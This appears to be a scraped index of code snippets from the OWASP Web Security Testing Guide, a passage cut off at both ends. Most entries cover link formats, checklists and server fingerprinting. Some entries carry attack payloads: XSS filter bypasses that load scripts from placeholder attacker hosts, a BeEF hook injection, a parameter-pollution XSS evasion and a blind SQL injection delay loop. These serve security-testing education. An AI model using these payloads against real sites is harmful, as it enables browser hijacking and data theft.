https://github.com/owasp/wstg/blob/master/document/6-Appendix/D-Encoded_Injection.md#2025-04-22_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nContent-Type: text/html; charset=UTF-8\n```\n\n----------------------------------------\n\nTITLE: WSTG Versioned Link Format in Markdown\nDESCRIPTION: Shows the recommended format for creating versioned links to WSTG documentation, ensuring persistent references across different versions of the guide.\nSOURCE: https://github.com/owasp/wstg/blob/master/README.md#2025-04-22_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\nhttps://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.html\n```\n\n----------------------------------------\n\nTITLE: WSTG Reference Format Example in Markdown\nDESCRIPTION: Demonstrates the standardized format for referencing WSTG scenarios using version-specific identifiers. The format follows WSTG-<version>-<category>-<number> pattern where category is a 4-character uppercase string and number is zero-padded.\nSOURCE: https://github.com/owasp/wstg/blob/master/README.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nWSTG-<category>-<number>\\nWSTG-INFO-02\\nWSTG-<version>-<category>-<number>\\nWSTG-v42-INFO-02\n```\n\n----------------------------------------\n\nTITLE: Running KiteRunner for API Scanning\nDESCRIPTION: Demonstrates how to use KiteRunner to scan a target for APIs using a wordlist. The command specifies the target URL, wordlist file, and status codes to consider as failures.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/01-API_Reconnaissance.md#2025-04-22_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nkr scan https://example.com/api -w /usr/share/wordlists/apis/routes-large.kite --fail-status-codes 404,403\n```\n\n----------------------------------------\n\nTITLE: Gmail Sitemap XML Content\nDESCRIPTION: Excerpt from Google's Gmail sitemap.xml showing the XML structure with URLs and alternate language references, which provides insights into the site's organization and internationalization approach.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage.md#2025-04-22_snippet_4\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<urlset xmlns=\"https://www.sitemaps.org/schemas/sitemap/0.9\" xmlns:xhtml=\"https://www.w3.org/1999/xhtml\">\n  <url>\n    <loc>https://www.google.com/intl/am/gmail/about/</loc>\n    <xhtml:link href=\"https://www.google.com/gmail/about/\" hreflang=\"x-default\" rel=\"alternate\"/>\n    <xhtml:link href=\"https://www.google.com/intl/el/gmail/about/\" hreflang=\"el\" rel=\"alternate\"/>\n    <xhtml:link href=\"https://www.google.com/intl/it/gmail/about/\" hreflang=\"it\" rel=\"alternate\"/>\n    <xhtml:link href=\"https://www.google.com/intl/ar/gmail/about/\" hreflang=\"ar\" rel=\"alternate\"/>\n...\n```\n\n----------------------------------------\n\nTITLE: Demonstrating HTTP RFC Violation for Web Server Error Testing\nDESCRIPTION: This snippet illustrates how to send a request that breaks the HTTP RFC, such as sending a very large path, breaking header formats, or changing the HTTP version. This technique can potentially expose web server error messages that developers may have forgotten to override.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_For_Improper_Error_Handling.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n- Try sending a request that breaks the [HTTP RFC](https://tools.ietf.org/html/rfc7231). One example would be to send a very large path, break the headers format, or change the HTTP version.\n    - Even if errors are handled on the application level, breaking the HTTP RFC may make the integrated web server show itself since it has to handle the request, and developers forget to override these errors.\n```\n\n----------------------------------------\n\nTITLE: Executing Complex PL/SQL Block for Request Processing in Oracle Applications\nDESCRIPTION: This PL/SQL block demonstrates how the application server processes requests, including checking against an exclusion list before executing user-requested procedures. It shows the internal mechanism that validates user input and how parameters are passed as bind variables.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle.md#2025-04-22_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\ndeclare\n rc__ number;\n start_time__ binary_integer;\n simple_list__ owa_util.vc_arr;\n complex_list__ owa_util.vc_arr;\nbegin\n start_time__ := dbms_utility.get_time;\n owa.init_cgi_env(:n__,:nm__,:v__);\n htp.HTBUF_LEN := 255;\n null;\n null;\n simple_list__(1) := 'sys.%';\n simple_list__(2) := 'dbms\\_%';\n simple_list__(3) := 'utl\\_%';\n simple_list__(4) := 'owa\\_%';\n simple_list__(5) := 'owa.%';\n simple_list__(6) := 'htp.%';\n simple_list__(7) := 'htf.%';\n if ((owa_match.match_pattern('foo.bar', simple_list__, complex_list__, true))) then\n  rc__ := 2;\n else\n  null;\n  orasso.wpg_session.init();\n  foo.bar(XYZ=>:XYZ);\n  if (wpg_docload.is_file_download) then\n   rc__ := 1;\n   wpg_docload.get_download_file(:doc_info);\n   orasso.wpg_session.deinit();\n   null;\n   null;\n   commit;\n  else\n   rc__ := 0;\n   orasso.wpg_session.deinit();\n   null;\n   null;\n   commit;\n   owa.get_page(:data__,:ndata__);\n  end if;\n end if;\n :rc__ := rc__;\n :db_proc_time__ := dbms_utility.get_time—start_time__;\nend;\n```\n\n----------------------------------------\n\nTITLE: Recognizing ZK Framework via HTML Comments\nDESCRIPTION: HTML comment pattern used to identify websites built with the ZK Ajax web application framework.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md#2025-04-22_snippet_12\n\nLANGUAGE: html\nCODE:\n```\n<!-- ZK\n```\n\n----------------------------------------\n\nTITLE: Performing Site-Specific Search Using Google\nDESCRIPTION: Demonstrates how to use the 'site:' operator in Google to limit search results to a specific domain. This technique is useful for discovering indexed content from a particular website.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage.md#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nsite:owasp.org\n```\n\n----------------------------------------\n\nTITLE: Attempting DNS Zone Transfer\nDESCRIPTION: Command to request a DNS zone transfer from a nameserver, which may reveal all DNS records including virtual hosts. This example shows a refused transfer, which is common with modern DNS servers.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver.md#2025-04-22_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n$ host -l www.owasp.org ns1.secure.net\nUsing domain server:\nName: ns1.secure.net\nAddress: 192.220.124.10#53\nAliases:\n\nHost www.owasp.org not found: 5(REFUSED)\n; Transfer failed.\n```\n\n----------------------------------------\n\nTITLE: XSS Attack Vector Bypassing Regex Filter\nDESCRIPTION: A malicious URL that demonstrates how to bypass the regex-based XSS filter by inserting an attribute between the script tag and src attribute, exploiting a weakness in the pattern matching logic.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md#2025-04-22_snippet_6\n\nLANGUAGE: text\nCODE:\n```\nhttps://example/?var=<SCRIPT%20a=\">\"%20SRC=\"https://attacker/xss.js\"></SCRIPT>\n```\n\n----------------------------------------\n\nTITLE: Example of REST URL with ASMX Service Endpoint\nDESCRIPTION: Shows a .NET ASMX web service endpoint pattern where the last URL segment doesn't have an extension and likely serves as a method name parameter.\nSOURCE: https://github.com/owasp/wstg/blob/master/REST_CS_Migrate.md#2025-04-22_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\nhttps://server/svc/Grid.asmx/GetRelatedListItems\n```\n\n----------------------------------------\n\nTITLE: Displaying WSTG-BUSL-01 ID in Markdown\nDESCRIPTION: A simple Markdown table displaying the ID 'WSTG-BUSL-01' for the Business Logic Data Validation test case.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n|ID          |\n|------------|\n|WSTG-BUSL-01|\n```\n\n----------------------------------------\n\nTITLE: Documentation References to OWASP Testing Guide Checklists in Markdown\nDESCRIPTION: A markdown reference to the OWASP Testing Guide Checklists resource, which provides guidance for testers validating specific vulnerabilities.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/2-Introduction/README.md#2025-04-22_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n[OWASP Testing Guide Checklists](https://github.com/OWASP/wstg/tree/master/checklists)\n```\n\n----------------------------------------\n\nTITLE: Steps for Testing Application Error Handling\nDESCRIPTION: This code block outlines the steps to test an application for error handling vulnerabilities. It includes identifying input points, analyzing expected input types, fuzzing inputs, and refining the fuzzing process based on initial results.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_For_Improper_Error_Handling.md#2025-04-22_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n1. Identify possible input points where the application is expecting data.\n2. Analyse the expected input type (strings, integers, JSON, XML, etc.).\n3. Fuzz every input point based on the previous steps to have a more focused test scenario.\n   - Fuzzing every input with all possible injections is not the best solution unless you have unlimited testing time and the application can handle that much input.\n   - If fuzzing isn't an option, handpick viable inputs that have the highest chance to break a certain parser (*e.g.* a closing bracket for a JSON body, a large text where only a couple of characters are expected, CLRF injection with parameters that might be parsed by servers and input validation controls, special characters that aren't applicable for filenames, etc.).\n   - Fuzzing with jargon data should be ran for every type as sometimes the interpreters will break outside of the developer's exception handling.\n4. Understand the service responding with the error message and try to make a more refined fuzz list to bring out more information or error details from that service (it could be a database, a standalone service, etc.).\n```\n\n----------------------------------------\n\nTITLE: META Tags Example from White House Website\nDESCRIPTION: HTML META tags extracted from the White House website showing various metadata including social media properties, descriptions, and application configuration that can reveal information about the site's technologies and integrations.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n...\n<meta property=\"og:locale\" content=\"en_US\" />\n<meta property=\"og:type\" content=\"website\" />\n<meta property=\"og:title\" content=\"The White House\" />\n<meta property=\"og:description\" content=\"We, the citizens of America, are now joined in a great national effort to rebuild our country and to restore its promise for all. – President Donald Trump.\" />\n<meta property=\"og:url\" content=\"https://www.whitehouse.gov/\" />\n<meta property=\"og:site_name\" content=\"The White House\" />\n<meta property=\"fb:app_id\" content=\"1790466490985150\" />\n<meta property=\"og:image\" content=\"https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\" />\n<meta property=\"og:image:secure_url\" content=\"https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\" />\n<meta name=\"twitter:card\" content=\"summary_large_image\" />\n<meta name=\"twitter:description\" content=\"We, the citizens of America, are now joined in a great national effort to rebuild our country and to restore its promise for all. – President Donald Trump.\" />\n<meta name=\"twitter:title\" content=\"The White House\" />\n<meta name=\"twitter:site\" content=\"@whitehouse\" />\n<meta name=\"twitter:image\" content=\"https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\" />\n<meta name=\"twitter:creator\" content=\"@whitehouse\" />\n...\n<meta name=\"apple-mobile-web-app-title\" content=\"The White House\">\n<meta name=\"application-name\" content=\"The White House\">\n<meta name=\"msapplication-TileColor\" content=\"#0c2644\">\n<meta name=\"theme-color\" content=\"#f5f5f5\">\n...\n```\n\n----------------------------------------\n\nTITLE: Referencing Example Template in Markdown\nDESCRIPTION: Shows how to link to an example template file using Markdown syntax. The link points to a file named '1-Testing_for_a_Cat_in_a_Box.md' in the '999-Foo_Testing' directory.\nSOURCE: https://github.com/owasp/wstg/blob/master/template/README.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n[example template](999-Foo_Testing/1-Testing_for_a_Cat_in_a_Box.md)\n```\n\n----------------------------------------\n\nTITLE: Client-Side JavaScript Object Input Examples\nDESCRIPTION: Examples showing how client-side JavaScript objects like window.location and window.referrer can be used as input sources for potential DOM-based XSS vulnerabilities.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\nvar data = window.location;\nvar result = someFunction(window.referrer);\n```\n\n----------------------------------------\n\nTITLE: Example of REST URL with Variable Segment\nDESCRIPTION: Illustrates a URL pattern with a highly variable segment (XXXX) that likely represents a parameter rather than a physical directory.\nSOURCE: https://github.com/owasp/wstg/blob/master/REST_CS_Migrate.md#2025-04-22_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\nhttps://server/src/XXXX/page\n```\n\n----------------------------------------\n\nTITLE: Lighttpd Server Response Headers\nDESCRIPTION: Example of HTTP response headers from a Lighttpd web server showing version information and header structure\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.md#2025-04-22_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\nHTTP/1.0 200 OK\nContent-Type: text/html\nAccept-Ranges: bytes\nETag: \"4192788355\"\nLast-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nContent-Length: 117\nConnection: close\nDate: Thu, 05 Sep 2019 17:57:57 GMT\nServer: lighttpd/1.4.54\n```\n\n----------------------------------------\n\nTITLE: Defining HTTP Code Block in Markdown\nDESCRIPTION: Shows how to create an HTTP code block using markdown syntax with the 'http' language identifier.\nSOURCE: https://github.com/owasp/wstg/blob/master/template/999-Foo_Testing/3-Format_for_HTTP_Request_Response.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n    ```http\n    Place request or response capture here\n    ```\n```\n\n----------------------------------------\n\nTITLE: HTTP Parameter Pollution XSS Evasion Technique\nDESCRIPTION: An advanced XSS filter evasion technique using HTTP Parameter Pollution (HPP) that splits the attack vector across multiple parameters with the same name to bypass pattern matching security mechanisms.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md#2025-04-22_snippet_8\n\nLANGUAGE: text\nCODE:\n```\nhttps://example/page.php?param=<script&param=>[...]</&param=script>\n```\n\n----------------------------------------\n\nTITLE: Example of REST URL with Date Parameter\nDESCRIPTION: Demonstrates a RESTful URL pattern where a date segment is used as a parameter within the URL path structure.\nSOURCE: https://github.com/owasp/wstg/blob/master/REST_CS_Migrate.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nhttps://server/srv/2013-10-21/use.php\n```\n\n----------------------------------------\n\nTITLE: Referencing HTTP Request/Response Formatting Guide in Markdown\nDESCRIPTION: Shows how to link to a formatting guide for HTTP requests and responses using Markdown syntax. The link points to a file named '3-Format_for_HTTP_Request_Response.md' in the '999-Foo_Testing' directory.\nSOURCE: https://github.com/owasp/wstg/blob/master/template/README.md#2025-04-22_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n[HTTP Requests and Responses](999-Foo_Testing/3-Format_for_HTTP_Request_Response.md)\n```\n\n----------------------------------------\n\nTITLE: Disabling CSS Using JavaScript Console Commands\nDESCRIPTION: JavaScript commands to manipulate and remove CSS styling from web pages through the browser console. Includes commands for removing external stylesheets, internal styles, inline styles and head tag content.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/F-Leveraging_Dev_Tools.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n$('style,link[rel=\"stylesheet\"]').remove();\n```\n\nLANGUAGE: javascript\nCODE:\n```\n$('style').remove();\n```\n\nLANGUAGE: javascript\nCODE:\n```\nArray.prototype.forEach.call(document.querySelectorAll('*'),function(el){el.removeAttribute('style');});\n```\n\nLANGUAGE: javascript\nCODE:\n```\n$('head').remove();\n```\n\n----------------------------------------\n\nTITLE: Detecting Robot Control Metadata in HTML\nDESCRIPTION: Example of an HTML META tag used to control search engine indexing. This could potentially be used to hide certain pages from search engines.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage.md#2025-04-22_snippet_6\n\nLANGUAGE: html\nCODE:\n```\n<META name=\"robots\" content=\"none\">\n```\n\n----------------------------------------\n\nTITLE: Alternative Time Delay for Blind SQL Injection\nDESCRIPTION: An alternative approach to create a time delay when WAITFOR is filtered or unavailable. This query uses a CPU-intensive loop to cause a noticeable delay that can be used for timing attacks.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md#2025-04-22_snippet_13\n\nLANGUAGE: sql\nCODE:\n```\ndeclare @i int select @i = 0\nwhile @i < 0xaffff begin\nselect @i = @i + 1\nend\n```\n\n----------------------------------------\n\nTITLE: WSTG Versioned Link Structure Example\nDESCRIPTION: Shows the proper URL structure for linking to specific WSTG scenarios using version-specific paths.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/2-Introduction/README.md#2025-04-22_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\nhttps://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server\n```\n\n----------------------------------------\n\nTITLE: HTML Input Tag Vulnerability Example for Stored XSS\nDESCRIPTION: Example HTML code showing a vulnerable input field containing an email address that could be exploited for stored XSS attacks. The value attribute is directly reflecting user input without proper sanitization.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<input class=\"inputbox\" type=\"text\" name=\"email\" size=\"40\" value=\"aaa@aa.com\" />\n```\n\n----------------------------------------\n\nTITLE: Analyzing Base64 Encoded Cipher Text for Padding Oracle Testing\nDESCRIPTION: Example of how to decode a Base64 encoded cipher text to identify if it meets the characteristics of data that might be vulnerable to padding oracle attacks, particularly checking for block cipher patterns.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle.md#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nDg6W8OiWMIdVokIDH15T/A== results after base64 decoding in 0e 0e 96 f0 e8 96 30 87 55 a2 42 03 1f 5e 53 fc. This seems to be random and 16 byte long.\n```\n\n----------------------------------------\n\nTITLE: Displaying WSTG-INPV-16 ID in Markdown\nDESCRIPTION: This snippet shows how to create a simple markdown table to display the ID 'WSTG-INPV-16' associated with the testing procedure.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n|ID          |\n|------------|\n|WSTG-INPV-16|\n```\n\n----------------------------------------\n\nTITLE: Creating OWASP Web Security Testing Guide Checklist in Markdown\nDESCRIPTION: This snippet presents a markdown table containing the OWASP Web Security Testing Guide checklist. It includes test categories, individual test items with IDs and names, and columns for status and notes.\nSOURCE: https://github.com/owasp/wstg/blob/master/checklists/checklist.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| Test ID           | Test Name                                                                  | Status | Notes |\n|-------------------|----------------------------------------------------------------------------|--------|-------|\n| **WSTG-INFO**     | **Information Gathering**                                                  |        |       |\n| WSTG-INFO-01      | Conduct Search Engine Discovery and Reconnaissance for Information Leakage |        |       |\n| WSTG-INFO-02      | Fingerprint Web Server                                                     |        |       |\n| WSTG-INFO-03      | Review Webserver Metafiles for Information Leakage                         |        |       |\n| WSTG-INFO-04      | Enumerate Applications on Webserver                                        |        |       |\n| WSTG-INFO-05      | Review Webpage Content for Information Leakage                             |        |       |\n| WSTG-INFO-06      | Identify Application Entry Points                                          |        |       |\n| WSTG-INFO-07      | Map Execution Paths Through Application                                    |        |       |\n| WSTG-INFO-08      | Fingerprint Web Application Framework                                      |        |       |\n| WSTG-INFO-09      | Fingerprint Web Application                                                |        |       |\n| WSTG-INFO-10      | Map Application Architecture                                               |        |       |\n| **WSTG-CONF**     | **Configuration and Deploy Management Testing**                            |        |       |\n| WSTG-CONF-01      | Test Network Infrastructure Configuration                                  |        |       |\n| WSTG-CONF-02      | Test Application Platform Configuration                                    |        |       |\n| WSTG-CONF-03      | Test File Extensions Handling for Sensitive Information                    |        |       |\n| WSTG-CONF-04      | Review Old Backup and Unreferenced Files for Sensitive Information         |        |       |\n| WSTG-CONF-05      | Enumerate Infrastructure and Application Admin Interfaces                  |        |       |\n| WSTG-CONF-06      | Test HTTP Methods                                                          |        |       |\n| WSTG-CONF-07      | Test HTTP Strict Transport Security                                        |        |       |\n| WSTG-CONF-08      | Test RIA Cross Domain Policy                                               |        |       |\n| WSTG-CONF-09      | Test File Permission                                                       |        |       |\n| WSTG-CONF-10      | Test for Subdomain Takeover                                                |        |       |\n| WSTG-CONF-11      | Test Cloud Storage                                                         |        |       |\n| WSTG-CONF-12      | Testing for Content Security Policy                                        |        |       |\n| **WSTG-IDNT**     | **Identity Management Testing**                                            |        |       |\n| WSTG-IDNT-01      | Test Role Definitions                                                      |        |       |\n| WSTG-IDNT-02      | Test User Registration Process                                             |        |       |\n| WSTG-IDNT-03      | Test Account Provisioning Process                                          |        |       |\n| WSTG-IDNT-04      | Testing for Account Enumeration and Guessable User Account                 |        |       |\n| WSTG-IDNT-05      | Testing for Weak or Unenforced Username Policy                             |        |       |\n| **WSTG-ATHN**     | **Authentication Testing**                                                 |        |       |\n| WSTG-ATHN-01      | Testing for Credentials Transported over an Encrypted Channel              |        |       |\n| WSTG-ATHN-02      | Testing for Default Credentials                                            |        |       |\n| WSTG-ATHN-03      | Testing for Weak Lock Out Mechanism                                        |        |       |\n| WSTG-ATHN-04      | Testing for Bypassing Authentication Schema                                |        |       |\n| WSTG-ATHN-05      | Testing for Vulnerable Remember Password                                   |        |       |\n| WSTG-ATHN-06      | Testing for Browser Cache Weakness                                         |        |       |\n| WSTG-ATHN-07      | Testing for Weak Password Policy                                           |        |       |\n| WSTG-ATHN-08      | Testing for Weak Security Question Answer                                  |        |       |\n| WSTG-ATHN-09      | Testing for Weak Password Change or Reset Functionalities                  |        |       |\n| WSTG-ATHN-10      | Testing for Weaker Authentication in Alternative Channel                   |        |       |\n| **WSTG-ATHZ**     | **Authorization Testing**                                                  |        |       |\n| WSTG-ATHZ-01      | Testing Directory Traversal File Include                                   |        |       |\n| WSTG-ATHZ-02      | Testing for Bypassing Authorization Schema                                 |        |       |\n| WSTG-ATHZ-03      | Testing for Privilege Escalation                                           |        |       |\n| WSTG-ATHZ-04      | Testing for Insecure Direct Object References                              |        |       |\n| **WSTG-SESS**     | **Session Management Testing**                                             |        |       |\n| WSTG-SESS-01      | Testing for Session Management Schema                                      |        |       |\n| WSTG-SESS-02      | Testing for Cookies Attributes                                             |        |       |\n| WSTG-SESS-03      | Testing for Session Fixation                                               |        |       |\n| WSTG-SESS-04      | Testing for Exposed Session Variables                                      |        |       |\n| WSTG-SESS-05      | Testing for Cross Site Request Forgery                                     |        |       |\n| WSTG-SESS-06      | Testing for Logout Functionality                                           |        |       |\n| WSTG-SESS-07      | Testing Session Timeout                                                    |        |       |\n| WSTG-SESS-08      | Testing for Session Puzzling                                               |        |       |\n| WSTG-SESS-09      | Testing for Session Hijacking                                              |        |       |\n| WSTG-SESS-10      | Testing JSON Web Tokens                                                    |        |       |\n| **WSTG-INPV**     | **Input Validation Testing**                                               |        |       |\n| WSTG-INPV-01      | Testing for Reflected Cross Site Scripting                                 |        |       |\n| WSTG-INPV-02      | Testing for Stored Cross Site Scripting                                    |        |       |\n| WSTG-INPV-03      | Testing for HTTP Verb Tampering                                            |        |       |\n| WSTG-INPV-04      | Testing for HTTP Parameter pollution                                       |        |       |\n| WSTG-INPV-05      | Testing for SQL Injection                                                  |        |       |\n| WSTG-INPV-06      | Testing for LDAP Injection                                                 |        |       |\n| WSTG-INPV-07      | Testing for XML Injection                                                  |        |       |\n| WSTG-INPV-08      | Testing for SSI Injection                                                  |        |       |\n| WSTG-INPV-09      | Testing for XPath Injection                                                |        |       |\n| WSTG-INPV-10      | Testing for IMAP SMTP Injection                                            |        |       |\n| WSTG-INPV-11      | Testing for Code Injection                                                 |        |       |\n| WSTG-INPV-12      | Testing for Command Injection                                              |        |       |\n| WSTG-INPV-13      | Testing for Format String Injection                                        |        |       |\n| WSTG-INPV-14      | Testing for Incubated Vulnerabilities                                      |        |       |\n| WSTG-INPV-15      | Testing for HTTP Splitting Smuggling                                       |        |       |\n| WSTG-INPV-16      | Testing for HTTP Incoming Requests                                         |        |       |\n| WSTG-INPV-17      | Testing for Host Header Injection                                          |        |       |\n| WSTG-INPV-18      | Testing for Server-Side Template Injection                                 |        |       |\n| WSTG-INPV-19      | Testing for Server-Side Request Forgery                                    |        |       |\n| **WSTG-ERRH**     | **Error Handling**                                                         |        |       |\n| WSTG-ERRH-01      | Testing for Improper Error Handling                                        |        |       |\n| WSTG-ERRH-02      | Testing for Stack Traces                                                   |        |       |\n| **WSTG-CRYP**     | **Cryptography**                                                           |        |       |\n| WSTG-CRYP-01      | Testing for Weak Transport Layer Security                                  |        |       |\n```\n\n----------------------------------------\n\nTITLE: BeEF Framework Hook Injection for Browser Exploitation\nDESCRIPTION: An example of how to inject a BeEF JavaScript hook into a vulnerable input field. This creates a connection between the victim's browser and the attacker's BeEF framework when the page is loaded.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.md#2025-04-22_snippet_4\n\nLANGUAGE: html\nCODE:\n```\naaa@aa.com\"><script src=https://attackersite/hook.js></script>\n```\n\n----------------------------------------\n\nTITLE: URI Generic Syntax in Markdown\nDESCRIPTION: Displays the generic URI syntax as defined in RFC3986, showing the structure with scheme, authority, path, query, and fragment components.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/00-API_Testing_Overview.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n> `URI = scheme \"://\" authority \"/\" path [ \"?\" query ] [ \"#\" fragment ]`\n```\n\n----------------------------------------\n\nTITLE: Sample HTTP Response with Cat Detection\nDESCRIPTION: Example HTTP response showing a successful (200) response from an Apache Tomcat server that includes cat-related content.\nSOURCE: https://github.com/owasp/wstg/blob/master/template/999-Foo_Testing/1-Testing_for_a_Cat_in_a_Box.md#2025-04-22_snippet_1\n\nLANGUAGE: http\nCODE:\n```\n HTTP/1.1 200\n [...]\n <!DOCTYPE html>\n <html lang=\"en\">\n     <head>\n         <meta charset=\"UTF-8\" />\n         <title>Apache Tomcat/10.0.4\n [...]\n```\n\n----------------------------------------\n\nTITLE: HTTP Headers Revealing Multiple Framework Indicators\nDESCRIPTION: Example showing how multiple HTTP headers can provide complementary information about frameworks, with X-Powered-By revealing PHP while X-Generator identifies the Swiftlet framework.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\nHTTP/1.1 200 OK\nServer: nginx/1.4.1\nDate: Sat, 07 Sep 2013 09:22:52 GMT\nContent-Type: text/html\nConnection: keep-alive\nVary: Accept-Encoding\nX-Powered-By: PHP/5.4.16-1~dotdeb.1\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nX-Generator: Swiftlet\n```\n\n----------------------------------------\n\nTITLE: Sample HTTP GET Request\nDESCRIPTION: Demonstrates a minimal HTTP GET request for a home page with essential headers.\nSOURCE: https://github.com/owasp/wstg/blob/master/template/999-Foo_Testing/3-Format_for_HTTP_Request_Response.md#2025-04-22_snippet_1\n\nLANGUAGE: http\nCODE:\n```\nGET / HTTP/1.1\nHost: localhost:8080\n```\n\n----------------------------------------\n\nTITLE: Identifying DotNetNuke Platform Marker\nDESCRIPTION: Distinctive text pattern that indicates a website is built on the DotNetNuke (DNN) platform, including a link to the official DNN website.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md#2025-04-22_snippet_9\n\nLANGUAGE: markdown\nCODE:\n```\nDNN Platform - [https://www.dnnsoftware.com](https://www.dnnsoftware.com)\n```\n\n----------------------------------------\n\nTITLE: Markdown Links for WSTG Appendices\nDESCRIPTION: Markdown formatted links to individual appendix sections using relative path references\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/README.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n# Appendix\n\nAppendix A. [Testing Tools Resource](A-Testing_Tools_Resource.md)\n\nAppendix B. [Suggested Reading](B-Suggested_Reading.md)\n\nAppendix C. [Fuzzing](C-Fuzzing.md)\n\nAppendix D. [Encoded Injection](D-Encoded_Injection.md)\n\nAppendix E. [History](E-History.md)\n\nAppendix F. [Leveraging Dev Tools](F-Leveraging_Dev_Tools.md)\n```\n\n----------------------------------------\n\nTITLE: Enumerating Joomla Admin Paths\nDESCRIPTION: List of common Joomla admin paths for security testing. These paths are typically used in Joomla installations to access various administrative 